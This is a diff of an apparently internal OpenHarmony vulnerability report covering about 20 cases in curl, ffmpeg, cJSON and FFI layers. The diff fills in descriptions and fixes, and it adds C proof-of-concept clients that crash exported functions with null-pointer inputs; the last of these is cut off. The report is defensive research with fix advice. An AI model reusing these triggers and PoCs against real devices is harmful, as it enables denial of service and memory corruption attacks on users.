@@ -1,8 +1,8 @@
 # OpenHarmony 漏洞分析报告
 
-生成日期：2026-10-07
+生成日期：2026-10-11
 工具版本：WildTrace (master)
-分析范围：19 个案例（公开 CVE 缺口回验 + 新发现候选）
+分析范围：20 个案例（公开 CVE 缺口回验 + 新发现候选）
 
 ## 案例总览
 
@@ -27,6 +27,7 @@
 | 17 | ipc_cj_array_null_validation | 新发现 | CWE-476 | foundation/communication/ipc/interfaces/innerkits/cj | 缺口回验 | 源级 |
 | 18 | kv_ffi_array_validation | 新发现 | CWE-476 | foundation/distributeddatamgr/kv_store | 缺口回验 | 源级 |
 | 19 | openssl_ocb_oneshot_iv_discard | CVE-2026-45445 | CWE-325 | third_party/openssl | 缺口回验 | ✅ |
+| 20 | udmf_ffi_setproperties_null_tag | 新发现 | CWE-476 | foundation/distributeddatamgr/udmf | 缺口回验 | 源级 |
 
 ## cjson-merge-nonobject-alias
 
@@ -35,20 +36,20 @@
 | 项目 | 值 |
 |---|---|
 | 组件 | third_party/cJSON |
-| 源码文件 | — |
-| 关键行号 | — |
+| 源码文件 | cJSON_Utils.c |
+| 关键行号 | 1325-1330 |
 | CVE 编号 | CVE-2026-87933 |
 | CWE 分类 | CWE-416 |
 
-> 源码片段：见 `—`（关键行号 —）。源码级证据记录：consume_target_before_duplicate: cJSON_Utils.c:1325-1330；recursive_child_deallocation: cJSON.c:253-280
+> 源码片段：见 `cJSON_Utils.c`（关键行号 1325-1330）。源码级证据记录：consume_target_before_duplicate: cJSON_Utils.c:1325-1330；recursive_child_deallocation: cJSON.c:253-280
 
 ### 2. 漏洞详细描述
 
-见 case.json
+Non-object patch aliases a target-owned subtree or the target itself. Patch only fixes that branch; object-alias cases and product callers need separate review.
 
-**触发条件**：见 PoC 注释
+**触发条件**：未记录；需补充触发条件
 
-**影响路径**：见漏洞描述
+**影响路径**：未记录；需补充产品可达性证据
 
 ### 3. PoC 源代码
 
@@ -132,12 +133,7 @@ int main(int argc, char **argv)
 ```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+使用工作台 cJSON 隔离验证，或 tools/cjson_case.py prepare / run / verify-runtime；源码提交必须匹配 case.json。
 
 ### 4. 影响分析
 
@@ -156,7 +152,7 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 
 ### 5. 修复建议
 
-回移上游修复（见 patch.diff）
+回移上游修复（见补丁附件）
 
 **修复补丁**（`patch.diff`）：
 ```diff
@@ -185,32 +181,29 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 | 项目 | 值 |
 |---|---|
 | 组件 | third_party/curl |
-| 源码文件 | — |
-| 关键行号 | — |
+| 源码文件 | lib/vtls/vtls.c |
+| 关键行号 | 176 |
 | CVE 编号 | CVE-2026-80231 |
 | CWE 分类 | CWE-488 |
 
-> 源码片段：见 `—`（关键行号 —）。源码级证据记录：native_ca_store appears only in setopt.c:2470/2485 (option assignment) and urldata.h:340 (field definition) plus legitimate backend reads (gtls.c/openssl.c/wolfssl.c/doh.c); the connection-reuse comparison match_ssl_primary_config() at lib/vtls/vtls.c:176 lists every other ssl_primary_config field but omits native_ca_store
+> 源码片段：见 `lib/vtls/vtls.c`（关键行号 176）。源码级证据记录：native_ca_store appears only in setopt.c:2470/2485 (option assignment) and urldata.h:340 (field definition) plus legitimate backend reads (gtls.c/openssl.c/wolfssl.c/doh.c); the connection-reuse comparison match_ssl_primary_config() at lib/vtls/vtls.c:176 lists every other ssl_primary_config field but omits native_ca_store
 
 ### 2. 漏洞详细描述
 
-见 case.json
+libcurl reuses an HTTPS connection without checking that both requests used the same CURLSSLOPT_NATIVE_CA disposition, so the second request may be validated in a weaker CA-store context than requested.
 
-**触发条件**：见 PoC 注释
+**触发条件**：未记录；需补充触发条件
 
-**影响路径**：见漏洞描述
+**影响路径**：未记录；需补充产品可达性证据
 
 ### 3. PoC 源代码
 
 > ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -242,20 +235,20 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 | 项目 | 值 |
 |---|---|
 | 组件 | third_party/curl |
-| 源码文件 | — |
-| 关键行号 | — |
+| 源码文件 | lib/cookie.c |
+| 关键行号 | 1049 |
 | CVE 编号 | CVE-2026-82209 |
 | CWE 分类 | CWE-201 |
 
-> 源码片段：见 `—`（关键行号 —）。源码级证据记录：upstream fix 2026-08-28 postdates the 20260819 snapshot; no backport commit found (grep CVE id + recent log); OH's lib/cookie.c retains the pre-refactor PSL structure without the tailmatch-clearing logic at the psl_is_cookie_domain_acceptable call site (line ~1049)
+> 源码片段：见 `lib/cookie.c`（关键行号 1049）。源码级证据记录：upstream fix 2026-08-28 postdates the 20260819 snapshot; no backport commit found (grep CVE id + recent log); OH's lib/cookie.c retains the pre-refactor PSL structure without the tailmatch-clearing logic at the psl_is_cookie_domain_acceptable call site (line ~1049)
 
 ### 2. 漏洞详细描述
 
-见 case.json
+With libpsl enabled, libcurl accepts a cookie whose Domain equals the request host when that host is itself a public suffix, keeping tailmatch=TRUE — a supercookie matching all subdomains of the suffix.
 
-**触发条件**：见 PoC 注释
+**触发条件**：HTTP response to a request for a PSL-listed host (e.g. localhost) carrying Set-Cookie with Domain equal to that host.
 
-**影响路径**：见漏洞描述
+**影响路径**：未记录；需补充产品可达性证据
 
 ### 3. PoC 源代码
 
@@ -408,12 +401,11 @@ int main(int argc, char **argv) {
 ```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+libcurl sources (OH tree) built with USE_LIBPSL; libpsl dev package; POSIX sockets (loopback only)
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -432,7 +424,7 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 
 ### 5. 修复建议
 
-回移上游修复（见 patch.diff）
+After psl_is_cookie_domain_acceptable() accepts, clear co->tailmatch when the cookie domain is itself a public suffix (upstream 95c1e891, adapted to OH's pre-refactor structure).
 
 **修复补丁**（`patch.diff`）：
 ```diff
@@ -472,32 +464,29 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 | 项目 | 值 |
 |---|---|
 | 组件 | third_party/ffmpeg |
-| 源码文件 | — |
-| 关键行号 | — |
+| 源码文件 | cfhd.c |
+| 关键行号 | 969 |
 | CVE 编号 | CVE-2026-70632 |
 | CWE 分类 | CWE-787 |
 
-> 源码片段：见 `—`（关键行号 —）。源码级证据记录：cfhd.c:969 and :1010 plane-size checks lack 'lowpass_width * 2 > s->plane[plane].width'; the similar check at :1049 is pre-existing code on another path. Both upstream fix diffs apply clean
+> 源码片段：见 `cfhd.c`（关键行号 969）。源码级证据记录：cfhd.c:969 and :1010 plane-size checks lack 'lowpass_width * 2 > s->plane[plane].width'; the similar check at :1049 is pre-existing code on another path. Both upstream fix diffs apply clean
 
 ### 2. 漏洞详细描述
 
-见 case.json
+CFHD transform-2 output width (lowpass_width*2) is stream-controlled and unbounded by plane width; decode writes past the plane allocation — heap OOB write, triggerable during stream probing via a crafted AVI.
 
-**触发条件**：见 PoC 注释
+**触发条件**：未记录；需补充触发条件
 
-**影响路径**：见漏洞描述
+**影响路径**：未记录；需补充产品可达性证据
 
 ### 3. PoC 源代码
 
 > ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -516,7 +505,7 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 
 ### 5. 修复建议
 
-回移上游修复（见 patch.diff）
+回移上游修复（见补丁附件）
 
 **修复补丁**（`patch.diff`）：
 ```diff
@@ -585,7 +574,7 @@ index 4d430e32efd94..128362ac62dcf 100644
 
 ### 2. 漏洞详细描述
 
-见 case.json
+DVB subtitle parser capacity guard adds three attacker-influenced ints and can signed-overflow (CWE-190), bypassing the bound so the copy overruns the 64 KiB stack buffer packet_buf (CWE-787); attack surface per CVE record is a crafted WTV file.
 
 **触发条件**：本报告为源码级验证（L4 三侧对照；运行级观测需构造使守卫表达式
 溢出的 WTV/传输流输入，报告人未构造端到端样本，如实申报）：
@@ -707,12 +696,9 @@ int main(int argc, char **argv)
 ```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -756,7 +742,7 @@ patch.diff 即上游原文，对 OH 检出直接适用）。单行等价改写�
 
 ### 2. 漏洞详细描述
 
-见 case.json
+Flood-fill point stack is allocated for the configured link size (with 4x slack) but driven by the current frame's dimensions; a sufficiently larger frame overruns the stack.
 
 **触发条件**：本报告为源码级验证（同族运行级证据见 CVE-2026-66036/66041 两案）：
   a) 上游对照：24c322fd 为该缺陷修复（diff 见附件，上游标注
@@ -881,12 +867,9 @@ int main(int argc, char **argv)
 ```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -931,9 +914,9 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 
 ### 2. 漏洞详细描述
 
-见 case.json
+hqdn3d denoise line buffers are allocated for the configured link width, but denoise runs with the frame's own dimensions; a frame with larger dimensions writes past the line buffers (heap OOB write).
 
-**触发条件**：见 PoC 注释
+**触发条件**：push a larger frame through a graph containing hqdn3d; direct trigger via buffersrc pass-through (no link mutation needed — more natural than CVE-2026-66041)
 
 **影响路径**：前提条件：产品/应用使用 ffmpeg 滤镜图且包含 hqdn3d 去噪滤镜
 （常用视频处理链），输入为不可信媒体（转码/滤镜服务场景典型）。
@@ -1064,12 +1047,9 @@ int main(int argc, char **argv)
 ```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -1107,32 +1087,29 @@ avfilter.c 动态尺寸白名单）。短期可先落附件 patch.diff 的窄化
 | 项目 | 值 |
 |---|---|
 | 组件 | third_party/ffmpeg |
-| 源码文件 | — |
-| 关键行号 | — |
+| 源码文件 | iamf_parse.c |
+| 关键行号 | 864 |
 | CVE 编号 | CVE-2026-66037 |
 | CWE 分类 | CWE-400 (unbounded allocation DoS) |
 
-> 源码片段：见 `—`（关键行号 —）。源码级证据记录：iamf_parse.c:864: count_label = ffio_read_leb(pbc) then av_calloc with no remaining-bytes check; upstream diff applies clean
+> 源码片段：见 `iamf_parse.c`（关键行号 864）。源码级证据记录：iamf_parse.c:864: count_label = ffio_read_leb(pbc) then av_calloc with no remaining-bytes check; upstream diff applies clean
 
 ### 2. 漏洞详细描述
 
-见 case.json
+IAMF mix_presentation OBU: count_label taken from stream leb128 and used directly in av_calloc without bounding to remaining input bytes — unbounded allocation DoS.
 
-**触发条件**：见 PoC 注释
+**触发条件**：未记录；需补充触发条件
 
-**影响路径**：见漏洞描述
+**影响路径**：未记录；需补充产品可达性证据
 
 ### 3. PoC 源代码
 
 > ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -1151,7 +1128,7 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 
 ### 5. 修复建议
 
-回移上游修复（见 patch.diff）
+回移上游修复（见补丁附件）
 
 **修复补丁**（`patch.diff`）：
 ```diff
@@ -1192,7 +1169,7 @@ index d74a8677d68d5..4c2df2c9e686d 100644
 
 ### 2. 漏洞详细描述
 
-见 case.json
+LCL/ZLIB video decoder leaves the not-decoded tail of decomp_buf uninitialized on short decompression and emits it as frame data: heap uninitialized-memory disclosure (CWE-908).
 
 **触发条件**：本报告为源码级验证（L4 三侧对照；运行级观测需构造解压后短于
 帧尺寸的 LCL/ZLIB 流，报告人未构造端到端样本，如实申报）：
@@ -1307,12 +1284,9 @@ int main(int argc, char **argv)
 ```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -1346,32 +1320,29 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 | 项目 | 值 |
 |---|---|
 | 组件 | third_party/ffmpeg |
-| 源码文件 | — |
-| 关键行号 | — |
+| 源码文件 | libavcodec/nvdec.c |
+| 关键行号 | 616 |
 | CVE 编号 | CVE-2026-64832 |
 | CWE 分类 | CWE-415 |
 
-> 源码片段：见 `—`（关键行号 —）。源码级证据记录：OH ff_nvdec_start_frame_sep_ref (nvdec.c:599) keeps 'ret = AVERROR(ENOMEM); goto fail;' at the decoder_pool exhaustion branch and the trailing 'fail: nvdec_fdd_priv_free(cf); return ret;' block — exactly what upstream removed. Naming-era note: OH uses ff_refstruct_pool_get, upstream patch context shows av_refstruct_pool_get (same API after the ff_->av_ rename); structure equivalent
+> 源码片段：见 `libavcodec/nvdec.c`（关键行号 616）。源码级证据记录：OH ff_nvdec_start_frame_sep_ref (nvdec.c:599) keeps 'ret = AVERROR(ENOMEM); goto fail;' at the decoder_pool exhaustion branch and the trailing 'fail: nvdec_fdd_priv_free(cf); return ret;' block — exactly what upstream removed. Naming-era note: OH uses ff_refstruct_pool_get, upstream patch context shows av_refstruct_pool_get (same API after the ff_->av_ rename); structure equivalent
 
 ### 2. 漏洞详细描述
 
-见 case.json
+nvdec hardware decode: when decoder surfaces are exhausted inside ff_nvdec_start_frame_sep_ref, the error path frees the fdd-owned context that ff_nvdec_start_frame already handed to the frame — double free on a crafted video file with NVDEC.
 
-**触发条件**：见 PoC 注释
+**触发条件**：crafted video driving NVDEC into the sep_ref pool-exhaustion error path
 
-**影响路径**：见漏洞描述
+**影响路径**：未记录；需补充产品可达性证据
 
 ### 3. PoC 源代码
 
 > ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -1390,7 +1361,7 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 
 ### 5. 修复建议
 
-回移上游修复（见 patch.diff）
+回移上游修复（见补丁附件）
 
 **修复补丁**（`patch.diff`）：
 ```diff
@@ -1437,9 +1408,9 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 
 ### 2. 漏洞详细描述
 
-见 case.json
+vf_quirc filter: a crafted PGS/SUP subtitle whose later frames have dimensions differing from the configured input writes out of bounds of the quirc buffer allocated for the first frame's size (heap OOB write).
 
-**触发条件**：见 PoC 注释
+**触发条件**：feed a subtitle stream with mismatched frame dimensions through the quirc filter
 
 **影响路径**：前提条件：产品/应用使用 ffmpeg 滤镜图且包含 quirc 滤镜（二维码
 检测场景），且滤镜图存在使 quirc 输入 link 尺寸在配置后变化的路径
@@ -1583,12 +1554,9 @@ int main(int argc, char **argv)
 ```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -1634,23 +1602,20 @@ quirc 的滤镜图中使用会改变链路尺寸的动态路径；对不可信�
 
 ### 2. 漏洞详细描述
 
-见 case.json
+RSCC screen-capture decoder: when the deflate output is shorter than the frame needs, the un-filled tail of inflated_buf is emitted as frame data — uninitialized heap disclosure.
 
-**触发条件**：见 PoC 注释
+**触发条件**：未记录；需补充触发条件
 
-**影响路径**：见漏洞描述
+**影响路径**：未记录；需补充产品可达性证据
 
 ### 3. PoC 源代码
 
 > ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -1669,7 +1634,7 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 
 ### 5. 修复建议
 
-回移上游修复（见 patch.diff）
+回移上游修复（见补丁附件）
 
 **修复补丁**（`patch.diff`）：
 ```diff
@@ -1728,7 +1693,7 @@ index 3715e1c6d42a8..5fde30ec35070 100644
 
 ### 2. 漏洞详细描述
 
-见 case.json
+Row-swap temp buffer is sized for plane 0 only; formats where another plane's width*pixstep exceeds it (e.g. NV12 with odd widths, per the upstream repro) overrun the buffer during row exchange.
 
 **触发条件**：本报告为源码级验证（同族运行级证据见 CVE-2026-66036/66041）：
   a) 上游对照：a7e38b61 为该缺陷修复（diff 见附件，复现样本
@@ -1862,12 +1827,9 @@ int main(int argc, char **argv)
 ```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -1911,7 +1873,7 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 
 ### 2. 漏洞详细描述
 
-见 case.json
+TY demuxer Series2 AC3 branch trims packet size by 2 even when the packet size is 0/1, underflowing the int to negative and driving negative-size packet operations.
 
 **触发条件**：本报告为源码级验证（运行级复现需构造 Series2 AC3 的 TiVo TY 流
 输入；TY chunk 结构与触发序列见附件对照.txt 的运行级复现路径
@@ -2033,12 +1995,9 @@ int main(int argc, char **argv)
 ```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -2084,7 +2043,7 @@ AC3_PKT_LENGTH 前置保护，保持原样不动。临时缓解：产品侧限�
 
 ### 2. 漏洞详细描述
 
-见 case.json
+WMA encoder extradata buffer lacks the FFmpeg-mandated input padding, letting downstream consumers that read extradata with padding assumptions read past the allocation (OOB read).
 
 **触发条件**：本报告为源码级验证（运行级观测需在下游按填充块读取 extradata
 的路径上触发，报告人未构造端到端样本，如实申报）：
@@ -2188,12 +2147,9 @@ int main(int argc, char **argv)
 ```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -2238,23 +2194,131 @@ extradata 分配做过同类加固，可按上游提交历史对照排查）。
 
 ### 2. 漏洞详细描述
 
-见 case.json
+AddWatcher 路径对 watcher.appEventFilters 的嵌套循环直接解引用 head[i]，filters.head=NULL 且 size>0 时第一层即空指针解引用；对照组合法输入由 FFI 层参数校验拦截返回错误码，不崩溃——缺陷精确限定于 null head + 非零 size 组合。
 
-**触发条件**：见 PoC 注释
+**触发条件**：CArrAppEventFilter { CAppEventFilter* head; int64_t size; }（frameworks/cj/ffi/include/common.h）
 
-**影响路径**：见漏洞描述
+**影响路径**：FfiOHOSHiAppEventAddWatcher（FFI 导出符号；watcher.appEventFilters 嵌套过滤循环）
 
 ### 3. PoC 源代码
 
-> ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）
+```c
+/* Malformed-input client for the OpenHarmony x86_64 CJ HiAppEvent AddWatcher ABI.
+ * ABI source: hiviewdfx_hiappevent frameworks/cj/ffi/include/common.h
+ *   CWatcher { char* name; CTriggerCondition; CArrAppEventFilter; callback×2 }
+ *   CArrAppEventFilter { CAppEventFilter* head; int64_t size; }
+ *   CAppEventFilter { char* domain; CArrUI32 eventTypes; CArrString names; }
+ * Candidate under test: FfiOHOSHiAppEventAddWatcher → nested filter loop
+ *   for(i < filters.size) { for(j < head[i].names.size) { head[i].names.head[j] } }
+ *   — triple unprotected: outer head, inner names.head, eventTypes.head + shift UB.
+ * No target implementation is copied into this client.
+ *
+ * Case matrix:
+ *   0  valid: 1 filter with valid domain+1 name+1 type     control
+ *   1  filters.head=NULL, size=1                           outer null (first crash layer)
+ *   2  head valid, domain valid, names.head=NULL, names.size=1   inner null (second layer)
+ *   3  head valid, eventTypes.head=NULL, size=1, type=100        shift UB (BIT_MASK << 100)
+ */
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stddef.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+
+typedef struct { uint32_t *head; int64_t size; } CArrUI32;
+typedef struct { char **head; int64_t size; } CArrString;
+typedef struct {
+    char *domain;
+    CArrUI32 eventTypes;
+    CArrString names;
+} CAppEventFilter;
+typedef struct { CAppEventFilter *head; int64_t size; } CArrAppEventFilter;
+typedef struct { int row; int size; int timeOut; } CTriggerCondition;
+typedef struct {
+    char *name;
+    CTriggerCondition triggerCondition;
+    CArrAppEventFilter appEventFilters;
+    void (*callbackOnTriggerRef)(int, int, int64_t);
+    void (*callbackOnReceiveRef)(char *, void *);
+} CWatcher;
+typedef struct { int64_t code; int64_t data; } RetDataI64;
+
+_Static_assert(sizeof(void *) == 8, "x86_64 caller required");
+
+static void dummy_trigger(int a, int b, int64_t c) { (void)a; (void)b; (void)c; }
+static void dummy_receive(char *a, void *b) { (void)a; (void)b; }
+
+int main(int argc, char **argv)
+{
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+    if (argc != 2) return 2;
+    void *library = dlopen(argv[1], RTLD_NOW | RTLD_LOCAL);
+    if (!library) { fprintf(stderr, "load_error=%s\n", dlerror()); return 3; }
+
+    RetDataI64 (*add_watcher)(CWatcher) =
+        (RetDataI64 (*)(CWatcher))dlsym(library, "FfiOHOSHiAppEventAddWatcher");
+    if (!add_watcher) { fputs("missing AddWatcher export\n", stderr); return 4; }
+
+    /* Case 0: valid */
+    uint32_t types0[] = { 1 };
+    char *names0[] = { (char *)"event_name" };
+    CAppEventFilter f0 = {
+        .domain = (char *)"validation.domain",
+        .eventTypes = { types0, 1 },
+        .names = { names0, 1 },
+    };
+    CWatcher w0 = {
+        .name = (char *)"validation_watcher",
+        .triggerCondition = { 1, 1, 0 },
+        .appEventFilters = { &f0, 1 },
+        .callbackOnTriggerRef = dummy_trigger,
+        .callbackOnReceiveRef = dummy_receive,
+    };
+
+    /* Case 1: outer head = NULL, size = 1 */
+    CWatcher w1 = w0;
+    w1.appEventFilters.head = NULL;
+    w1.appEventFilters.size = 1;
+
+    /* Case 2: inner names.head = NULL, names.size = 1 */
+    CAppEventFilter f2 = f0;
+    f2.names.head = NULL;
+    f2.names.size = 1;
+    CWatcher w2 = w0;
+    w2.appEventFilters.head = &f2;
+
+    /* Case 3: eventTypes.head = NULL + shift UB attempt (type value 100) */
+    CAppEventFilter f3 = f0;
+    f3.eventTypes.head = NULL;
+    f3.eventTypes.size = 1;
+    CWatcher w3 = w0;
+    w3.appEventFilters.head = &f3;
+
+    const struct { CWatcher *w; const char *name; } cases[] = {
+        { &w0, "valid_control" },
+        { &w1, "outer_head_null_candidate" },
+        { &w2, "inner_names_null_candidate" },
+        { &w3, "eventtypes_null_shift_ub_variant" },
+    };
+
+    for (size_t k = 0; k < sizeof(cases) / sizeof(cases[0]); k++) {
+        printf("case=%zu name=%s start\n", k, cases[k].name);
+        RetDataI64 ret = add_watcher(*cases[k].w);
+        printf("case=%zu name=%s done code=%lld data=%lld\n", k, cases[k].name,
+               (long long)ret.code, (long long)ret.data);
+    }
+    puts("malformed_matrix=completed_no_crash");
+    return 0;
+}
+
+```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -2295,23 +2359,86 @@ AddWatcher 入口对 appEventFilters.head 判空（head==NULL 且 size>0 时返�
 
 ### 2. 漏洞详细描述
 
-见 case.json
+CJ_WriteByteArray iterates value.data for a positive len without checking data for null.
 
-**触发条件**：见 PoC 注释
+**触发条件**：foundation/communication/ipc/interfaces/innerkits/cj/include/ipc_utils_ffi.h:78-81
 
-**影响路径**：见漏洞描述
+**影响路径**：foundation/communication/ipc/interfaces/innerkits/cj/src/ipc_ffi.cpp:365-381
 
 ### 3. PoC 源代码
 
-> ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）
+```c
+/* Malformed-input client for the OpenHarmony x86_64 CJ IPC exported ABI.
+ * ABI source: IPC interfaces/innerkits/cj/include/ipc_utils_ffi.h and ipc_ffi.h
+ * at edc6f3ab59a5b6fbbda92c427e1e4da6f6d64ae3 (same as ipc_normal_roundtrip.c).
+ * Candidate under test: CJ_WriteByteArray iterates value.data for a positive
+ * len without checking data for null (message_sequence_impl.cpp).
+ * No target implementation is copied into this client.
+ *
+ * Case matrix (each prints start/done markers unbuffered so run.log pinpoints
+ * the failing case even on a raw crash):
+ *   0  data=NULL, len=0    control: loop body never runs, expect no crash
+ *   1  data=NULL, len=1    the candidate: expected zero-page read per source
+ *   2  data=NULL, len=64   variant with larger len
+ *   3  data=valid, len=1   post-crash control (skipped only if earlier case died)
+ * Either outcome of case 1/2 is a valid experiment result: a crash
+ * (SIGSEGV, run exit 139) confirms the candidate at real-library level; a
+ * returned error code (printed as write_error) disproves reachability of the
+ * unguarded loop in this build. Do not interpret anything without the log.
+ */
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stddef.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+
